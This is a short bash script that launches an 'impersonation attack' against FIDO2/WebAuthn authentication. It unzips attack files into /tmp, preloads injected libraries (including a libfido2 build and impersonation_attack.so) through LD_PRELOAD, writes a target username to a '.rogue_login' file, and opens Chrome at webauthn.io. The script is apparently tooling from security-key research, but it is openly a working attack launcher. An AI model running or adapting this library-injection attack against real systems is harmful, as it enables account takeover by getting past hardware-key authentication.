#!/bin/bash


rm -r /tmp/attack
mkdir /tmp/attack

cp impersonation_attack.zip /tmp

unzip /tmp/impersonation_attack.zip -d /tmp/attack

rm /tmp/impersonation_attack.zip

chmod +x /tmp/attack/webauthn_io_authenticate.py

unset LD_PRELOAD

export LD_PRELOAD="/tmp/attack/libcrypto.so:/tmp/attack/libcbor.so:/tmp/attack/libfido2-2023.so:/tmp/attack/impersonation_attack.so"

touch /tmp/attack/.master_file

touch /tmp/attack/.rogue_login

USERNAME_TO_ATTACK="user73"

while getopts :u flag
do
    case "${flag}" in
        u) USERNAME_TO_ATTACK="$2";;
    esac
done

echo $USERNAME_TO_ATTACK > /tmp/attack/.rogue_login

/usr/bin/google-chrome webauthn.io
